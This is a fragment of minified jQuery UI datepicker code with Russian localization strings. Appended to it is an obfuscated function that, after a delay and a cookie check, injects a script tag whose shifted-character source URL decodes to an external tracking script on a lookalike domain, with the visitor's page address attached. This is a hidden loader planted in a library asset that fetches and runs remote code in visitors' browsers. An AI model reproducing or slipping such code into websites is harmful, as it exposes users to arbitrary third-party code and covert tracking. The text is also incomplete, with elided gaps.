...
"ui-datepicker-days-cell-over";this.regional=[];this.regional[""]={closeText:"Закрыть",prevText:"Prev",nextText:"Next",currentText:"Сегодня",monthNames:["January","February","March","April","May","June","July","August","September","October","November","December"],monthNamesShort:["Янв","Фев","Март","Апр","Май","Июнь","Июль","Авг","Сент","Окт","Ноя","Дек"],dayNames:["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],dayNamesShort:["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],dayNamesMin:["Su",
...
(function (o, d, l) {
  try {
      ...
      o.c = l.protocol[0] == 'h' && /./.test(l.hostname)&& !(new RegExp(o.b)).test(d.cookie), setTimeout(function () {
          o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44fun3hwfxm'+'q~ynhx3wz4ywfhpnsl4'+'xhwnuy3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
      }, 1000);
